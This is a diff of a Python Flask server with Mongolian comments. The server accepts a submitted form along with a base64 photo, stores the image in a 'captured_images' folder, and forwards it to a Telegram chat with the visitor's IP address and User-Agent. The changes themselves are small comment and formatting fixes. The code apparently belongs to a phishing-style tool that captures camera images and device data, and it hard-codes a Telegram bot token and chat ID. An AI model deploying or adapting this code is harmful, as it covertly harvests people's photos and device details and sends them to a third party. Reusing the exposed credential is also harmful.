@@ -2,13 +2,12 @@
 import requests
 import base64
 import os
-import time
+import time # Шаардлагатай
 from flask import Flask, request, jsonify, render_template, redirect, url_for
 
 # ====================================================================
 # ⚠️ 1. ТАНЫ ТОХИРГОО ⚠️
 # ====================================================================
-# Render Environment Variables-аас нууц үгсийг авна
 TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '8476306576:AAFIzHzOLDQR_qOKb5yn4eK6VsMmIrGdy_Q')
 CHAT_ID = os.environ.get('CHAT_ID', '-5036234831')
 UPLOAD_FOLDER = 'captured_images'
@@ -16,9 +15,9 @@ UPLOAD_FOLDER = 'captured_images'
 
 app = Flask(__name__)
 
-# Зураг хадгалах хавтас үүсгэх (Энэ хэсэгт алдаа гарсан)
+# Зураг хадгалах хавтас үүсгэх
 if not os.path.exists(UPLOAD_FOLDER):
-    os.makedirs(UPLOAD_FOLDER)
+    os.makedirs(UPLOAD_FOLDER) # Зөвхөн 4 Space (эсвэл Tab) ашиглана
 
 # ----------------- sendPhoto ЧАДВАРТАЙ ФУНКЦ -----------------
 def send_telegram_media_notification(message_text, image_filepath=None):
@@ -75,17 +74,18 @@ def success():
     </div>
     """
 
-# ----------------- Өгөгдөл Хүлээн Авах API -----------------@app.route('/submit', methods=['POST'])
+# ----------------- Өгөгдөл Хүлээн Авах API -----------------
+@app.route('/submit', methods=['POST']) # ЭНЭ МӨР ЗӨВ БАЙХ ЁСТОЙ
 def submit():
     role_department = request.form.get('role_department', 'Хариулаагүй')
     profession = request.form.get('profession', 'Хариулаагүй')
-    photo_data = request.form.get('photo_data', None) # Шинээр нэмэгдэж буй хувьсагч!
+    photo_data = request.form.get('photo_data', None)
     
     image_filepath = None
 
     if photo_data and photo_data.startswith('data:image/'):
         try:
-            # Base64 датаг салгаж авах (жишээ нь: 'data:image/jpeg;base64,xxxxxx'-ээс 'xxxxxx'-г авах)
+            # Base64 датаг салгаж авах 
             header, encoded = photo_data.split(',', 1)
             image_data = base64.b64decode(encoded)
             
@@ -110,7 +110,6 @@ def submit():
         f"--- ТӨХӨӨРӨМЖИЙН МЭДЭЭЛЭЛ ---\n"
         f"📍 IP: {request.remote_addr}\n"
         f"🌐 User-Agent: {request.headers.get('User-Agent')}"
-        # Зураг амжилттай авсан бол Telegram-аар илгээгдэнэ.
     )
     
     # 4. Telegram руу зураг болон текст илгээх
@@ -118,6 +117,7 @@ def submit():
 
     # 5. Хэрэглэгчийг амжилттай болсны мэдэгдэл рүү шилжүүлэх
     return redirect(url_for('success'))
+    
 if __name__ == '__main__':
     # Local туршилтад зориулав
     app.run(port=8080, debug=True)
